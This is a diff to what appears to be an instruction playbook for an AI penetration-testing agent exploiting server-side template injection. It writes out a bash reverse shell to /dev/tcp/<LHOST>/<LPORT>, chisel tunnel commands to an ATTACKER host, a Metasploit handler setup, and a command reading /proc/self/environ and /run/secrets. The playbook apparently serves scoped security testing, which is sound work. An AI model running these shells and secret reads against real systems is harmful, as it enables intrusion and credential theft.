@@ -35,7 +35,7 @@ Every step uses tools already available to the agent. The only new install is `t
 - `execute_curl` for crafted single-shot probes and exploit requests.
 - `execute_code` for hand-rolled per-engine payload sweeps (Pug, Handlebars, Nunjucks, Razor, Thymeleaf view-name confusion) where neither `sstimap` nor `tplmap` covers the engine.
 - `execute_playwright` to confirm reflection context (HTML attribute, JS string, CDATA) on JS-heavy SPAs.
-- `kali_shell` for `sstimap`, `tplmap`, `interactsh-client` (OAST), `chisel`, `ngrok`, and any one-off `jq` post-processing.
+- `kali_shell` for `sstimap`, `tplmap`, `interactsh-client` (OAST), and any one-off `jq` post-processing. (Your reverse port and any tunnel are RedAmon-managed and shown in the "Pre-Configured Payload Settings" block - do not start `chisel`/`ngrok` yourself.)
 
 ### Captured-traffic workflow (proxy_brain tools)
 
@@ -299,8 +299,8 @@ Quick-reference RCE primitives for less-common engines:
 Once code execution is proven, demonstrate impact at the minimum level required by the engagement.
 
 1. **Stable shell upgrade** (only if engagement scope permits a foothold):
-   - Stage a tunnel: `chisel server -p 8080 --reverse` on the attacker host, then through the SSTI gadget run `chisel client ATTACKER:8080 R:9001:127.0.0.1:9001`.
-   - Or use a single connect-back: `bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'` wrapped in the engine-specific exec primitive.
+   - Take LHOST and your reverse port (LPORT) from the "Pre-Configured Payload Settings" block - do NOT hardcode a port, and do NOT start `chisel`/`ngrok` yourself (your tunnel, if any, is RedAmon-managed and already points at your handler).
+   - Connect back to the handler (`use exploit/multi/handler; set payload cmd/unix/reverse_bash`): `bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'` wrapped in the engine-specific exec primitive, where `<LHOST>`/`<LPORT>` are the block's values.
 2. **Configuration and secret enumeration** through the same in-template `popen` / `exec` primitive:
    ```
    cat /proc/self/environ; ls -la /run/secrets/ 2>/dev/null; cat /var/lib/cloud/data/instance-id 2>/dev/null
